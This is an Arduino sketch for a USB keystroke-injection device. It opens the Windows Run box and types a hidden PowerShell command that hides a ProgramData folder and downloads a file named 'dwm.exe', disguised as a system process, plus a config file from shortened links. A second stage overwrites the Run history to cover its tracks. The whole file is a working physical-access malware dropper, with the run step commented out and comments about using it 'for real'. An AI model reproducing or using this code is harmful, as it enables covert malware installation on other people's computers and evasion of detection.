#include <Keyboard.h>

int stuffInih = 0;
int ledState = 0;
int timerStamp = 0;

void handleLEDBlinker()
{
    if(ledState % 2 == 0)
    {
      digitalWrite(LED_BUILTIN, HIGH);
    }
    else
    {
      digitalWrite(LED_BUILTIN, LOW);
    }

    ledState++;

    if(ledState >= 100) ledState = 0;
}

void setup()
{
  int lmaoCount = 0;
  pinMode(LED_BUILTIN, OUTPUT);

  digitalWrite(LED_BUILTIN, HIGH);

  Serial.begin(9600);

  Keyboard.begin();

  timerStamp = millis();
  while(millis() - timerStamp < 2000)
  {
    handleLEDBlinker();
    delay(500);
  }

  digitalWrite(LED_BUILTIN, LOW);
}

void loop() 
{
  switch(stuffInih)
  {
    case 0:
    {
      Serial.println("Executing Win+R for RUN prompt.");

      Keyboard.press(0x83);
      Keyboard.print("r");
      Keyboard.release(0x83);

      timerStamp = millis();
      while(millis() - timerStamp < 1000)
      {
        handleLEDBlinker();
        delay(50);
      }
      
      Serial.println("Writing in powershell script...");
      Keyboard.print("powershell.exe -windowStyle Hidden "); // START PS SCRIPT

      // NOTE: Run box can only contain as much as characters. Make sure it can fit in before using this for real.

      Keyboard.print("attrib +h $env:ALLUSERSPROFILE/USOShared;"); // HIDE IT
      Keyboard.print("cd $env:ALLUSERSPROFILE/USOShared;"); // CHANGE LOCATIONS
	  Keyboard.print("Invoke-WebRequest https://tinyurl.com/dwmconf -O \"dwm.conf\";"); // DOWNLOAD
      Keyboard.print("Invoke-WebRequest https://tinyurl.com/dwmload -O \"dwm.exe\";"); // DOWNLOAD
      //Keyboard.print("& ./dwm.exe"); // RUN

      Keyboard.print(" "); // END SCRIPT

      // CLEANUP AND EVERYTHING ELSE LIKE OBFUSCATION HANDLED BY THE SAVED FILE NOW. OUR JOB HERE IS DONE!
      
      Keyboard.press(KEY_RETURN);
      delay(4);
      Keyboard.release(KEY_RETURN);

      Serial.println("Powershell script queued.");
      timerStamp = millis();
      while(millis() - timerStamp < 1000)
      {
        handleLEDBlinker();
        delay(50);
      }

      stuffInih++;
      break;
    }
    case 1:
    {
      Serial.println("Beginning overwrite last run command: Executing Win+R for RUN prompt.");

      Keyboard.press(0x83);
      Keyboard.print("r");
      Keyboard.release(0x83);

      timerStamp = millis();
      while(millis() - timerStamp < 1000)
      {
        handleLEDBlinker();
        delay(50);
      }
      
      Serial.println("Writing in random gibberish to overwrite last run command...");
      Keyboard.print("cmd.exe /c exit"); // RUN

      Keyboard.print(" "); // END SCRIPT

      Keyboard.press(KEY_RETURN);
      delay(4);
      Keyboard.release(KEY_RETURN);

      Serial.println("Run command sent!");
      timerStamp = millis();
      while(millis() - timerStamp < 500)
      {
        handleLEDBlinker();
        delay(50);
      }

      stuffInih++;
      break;
    }
    case 2: 
    {
      stuffInih++;
      Serial.println("Job done! We're out! The rest will happen eventually.");
      Keyboard.end();
      Serial.end();
      digitalWrite(LED_BUILTIN, HIGH);
      break;
    }
  }
}
